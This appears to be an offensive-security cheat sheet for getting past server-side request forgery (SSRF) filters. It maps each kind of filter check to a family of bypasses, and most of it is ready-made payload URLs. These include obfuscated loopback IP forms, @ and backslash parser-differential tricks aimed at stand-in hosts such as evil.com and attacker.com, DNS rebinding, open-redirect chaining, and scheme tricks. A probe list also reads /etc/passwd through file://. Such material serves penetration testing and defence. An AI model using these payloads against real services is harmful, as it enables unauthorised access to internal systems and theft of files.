# Bypass — check-type → bypass-family

Every filter is one of a small set of check-types. Name the check
first; the bypass-family follows. Don't spray — diagnose the check,
then pick the family that answers it.

---

## 1. The check-type taxonomy — which check is running

```text
A. STRING-CHECK    — "does the url contain X" / "does it start/end
                     with Y" — the parser never sees a resolved-IP —
                     the BYPASS is the string-family: encodings,
                     @/#/?-confusion, unicode, case, separators
B. HOST-CHECK      — "is the hostname whitelisted" — parses the url,
                     compares the host — the bypass is the parser-
                     differential: the validator's host ≠ the
                     fetcher's host — the two-parser game
C. IP-BLACKLIST    — "does the IP resolve to a private range" —
                     resolves ONCE — the bypass is dns-rebind OR the
                     IP-encodings that don't look-like-IPs OR the
                     A/AAAA asymmetry
D. PORT-CHECK      — "only port 80/443" — the port is checked —
                     the bypass: the target on an allowed-port —
                     or the port-form tricks (:080, :0x50)
E. SCHEME-CHECK    — "only http(s)" — the scheme-list — the bypass:
                     the allowed-scheme tricks — https on odd-ports —
                     or the parser's scheme-looseness
F. FETCH-TIME      — "the resolved IP is used for the fetch" — the
                     check and the fetch are ONE operation — the
                     resolved-IP IS what's dialled — NO rebind —
                     the bypass is a different mechanism — redirect,
                     parser-diff, or a different scheme entirely
G. PER-HOP         — "every redirect-hop re-validated" — the chain
                     is dead — pivot to non-redirect families
```

## 2. The diagnostic — name the check

```text
send a ladder — each probes a different check:
  url=http://example.com/          → the baseline — external-ok?
  url=http://127.0.0.1/            → internal-IP → what error?
  url=http://localhost/            → internal-NAME → what error?
  url=http://internal-notreal.invalid/  → fake-name → dns-fail?
  url=file:///etc/passwd            → file-scheme → scheme-error?
  url=http://2130706433/            → decimal-IP → which-check?
  url=http://your-callback/        → callback → fetch-works?
the ERROR-TEXT names the stage — error-analysis.md the vocabulary —
"blocked"→filter; "no such host"→dns; "refused"→tcp-reached;
"scheme"→scheme-check
```

## 3. The check-family → bypass-family table

| Check | The bypass-family | Reference |
|---|---|---|
| "contains 127." | octal/hex/decimal/short/ipv6 ip-forms | url-parsing §1 |
| "is it a hostname" | nip.io/localtest.me/lvh.me names | url-parsing §1 |
| "starts with http" | `HtTp://` case / `http+x://` | url-parsing §8 |
| "ends with .com" | `internal.allowed.com` subdomain | url-parsing §11 |
| "host must equal X" | `X@internal` / `internal@X` — the @-game | url-parsing §3 |
| "must be our domain" | `ourdomain.attacker.com` / open-redirect-on-it | redirect §3 |
| "no private ips" | dns-rebind — the resolve-twice | dns-rebind |
| "scheme in {http}" | `file://`/`gopher://` the other-schemes | protocol-smuggling |
| "no redirects" | (check is per-hop — dead end — pivot) | redirect-chains §4 |
| "port == 80" | the service on :80 already / `:080` form | payload §M |
| parses-the-url | the `@`-differential — parser-diff | url-parsing §3 |
| a regex on the string | the regex-shape tricks — `^http` + `\bhost\b` | below |

## 4. The string-check family — the "contains" and "starts-with"

```text
Check: "must contain example.com" — substring anywhere:
  http://evil.com/?u=example.com
  http://example.com.evil.com/
  http://evil.com/#example.com
  http://internal@example.com/       — userinfo-contains
  http://example.com.evil.com/
Check: "must start with http://example.com":
  http://example.com@internal/        — the @-swap — starts right,
                                        fetches internal
  http://example.com.evil.com/
  http://example.com.attacker.com/
Check: "must end with .example.com" — endswith-check:
  http://attacker.com/.example.com   — ends in the path — host is
                                        attacker — the suffix is in
                                        the path — passes endswith
  http://attacker.com?.example.com   — ends in query
  http://attacker.com#.example.com   — ends in fragment
  http://attacker.com/.example.com/  — trailing-slash-literal
Check: "must not contain 127.":
  http://2130706433/ http://0x7f000001/ http://0177.0.0.1/
  http://127.1/ http://0/ http://[::1]/ — every IP-form that isn't
  the literal string
Check: regex "^\w+://(www\.)?example\.com":
  http://example.com@internal/       — the @-splits — the regex
                                      matches the prefix — the host
                                      is internal
  http://example.com.internal.com/
  http://example.com\@internal/
```

## 5. The host-check family — the two-parser game

```text
The validator parses the url to get the host; the fetcher parses
the SAME string and gets a different host — the check passes on
one answer, the fetch goes to the other:

http://example.com@internal/      — validator-host=internal vs
                                    example.com — which parser?
                                    the @-precedence differs
http://internal\@example.com/      — the \-as-/ trick — some read
                                    host=internal\, some read \ as
                                    / → host=internal
http://internal%5c@example.com/    — encoded-\ — decode-order
http://internal%40example.com/     — encoded-@ — the literal-vs-
                                    decoded-@ split
http://internal:80@example.com/    — port-then-@ — which wins?
http://internal#@example.com/      — #-ends-authority — validator
                                    sees fragment-@ — fetcher sees
                                    host=internal
http://internal?@example.com/      — ?-same
http://internal%23@example.com/
http://internal%3f@example.com/
http://internal%2f@example.com/
```

The test: send BOTH orders — `allowed@internal` AND `internal@allowed`
— whichever the filter accepts reveals its parser-side — then the
OTHER side is what the fetcher uses — they're the same string,
different meanings.

## 6. The ip-blacklist family — resolution-tricks

```text
Check: resolve(name) → ip ∈ private-range → block
Bypass A — the name resolves public at check-time, internal at
  fetch-time → dns-rebind — the two-lookup gap
Bypass B — the ip-encoding forms — an ip that doesn't LOOK like
  127.* in the string but IS — octal/hex/decimal/short — the check
  may look for the literal "127." — the encoded forms beat it
Bypass C — A/AAAA asymmetry — the check looks at A (public) —
  the fetcher prefers AAAA (::1) — the v6-shadow
Bypass D — the name resolves to a private-ip you WANT — the
  check ran, saw private, blocked — but the SUBSTRING-check that
  only checks "is it a hostname" — a name for the internal-ip —
  127.0.0.1.nip.io — wait that's still resolution — the check
  resolves to internal → blocked — UNLESS the check is string-
  only — the nip-family beats STRING-checks not resolution-checks
```

## 7. The scheme-check family — non-http reaches

```text
Check: "^https?://" → only http(s) — the scheme-table is dead —
  BUT — the parser's scheme-looseness:
  "HtTp://"   — case — the check lowercases? or not?
  "http+x://", "httpx://" — prefix-schemes — some parsers take
  "x http://", " http://", "\thttp://" — leading-ws
  "http:/x", "http:x" — missing-slashes — the opaque-form
  "http:\\x", "http:\\\\x" — backslashes — curl-normalizes
  "gophers://", "tftp://" — non-http that pass a lax check
```

## 8. The port-check family

```text
Check: "port must be 80/443":
  http://internal:80/  — the service IS on 80 — nothing to bypass
  http://internal:443/ — or 443 — https-internal
  http://internal:080/ — padded — port-80-decimal — the check
                          compares "080"=="80"? string-vs-int
  http://internal:0x50/ — hex-80 — int-parse vs string-parse
  http://internal:00080/
  the other-service port-map — is there a web-service ON 80?
   — nginx/apache on 80 → the internal-web — 80 is usually web —
     the other-ports are the goal but the check pins 80 — a web-
     service on 80 it is
```

## 9. The redirect-family — validate-entry-not-hops

```text
The check validates the INPUT-url — redirects re-validate? —
the escape: url=allowed-open-redirect → 302 → internal — the
whole redirect-chains.md — the bypass needs the follow to NOT
re-check — the test:
  url=http://allowed/redirect?to=http://127.0.0.1/
    → internal-content → per-hop NOT re-checked → the door
    → redirect-error → re-checked → dead — pivot
```

## 10. The parser-differential family — two-parsers-one-string

```text
validator-parser vs fetcher-parser — the disagreement-space:
  - java-url vs curl: `http://a\b@b/` — java: host=a\b; curl: the
    \ is a / → host-b — the fetcher reaches b — validator saw a
  - node-legacy vs WHATWG: url.parse vs new URL — the @ and \
  - python-urlparse: takes the LAST @ as the split — most take
    the FIRST
  - the %-decode order — validator-decodes-then-checks vs
    fetcher-decodes-then-sends
  - the unicode-normalization — fullwidth-chars vs ascii
  - the case-fold — IDN-punycode — the unicode-domain tricks
```

`sanitizer_fuzz` differential-sweeps the encodings — the parser-
differential is empirical — map which FORMS pass then which
FORMS the fetcher uses.

## 11. The second-order bypass — when the input isn't fetched

```text
the url-param isn't fetched NOW — it's stored — the fetch is
deferred — the check ran on the INPUT — the fetch happens later —
perhaps in a different context — or the stored-value is used in a
template — the second-order path — see ctf-shapes deferred-shapes
```

## 12. The "no-bypass" — when the check is airtight

```text
a fetch-time check where the RESOLVED-IP is what's dialled is
not bypassable by url-tricks — the resolved-ip IS the destination —
the only doors: rebind (the resolve-twice race) or the OTHER
mechanism — scheme-side, parser-side, or a different class entirely
(pivot to the sibling: file-upload→avatar-fetch, xml→xxe-fetch,
bot-visit→browser-navigation)
```
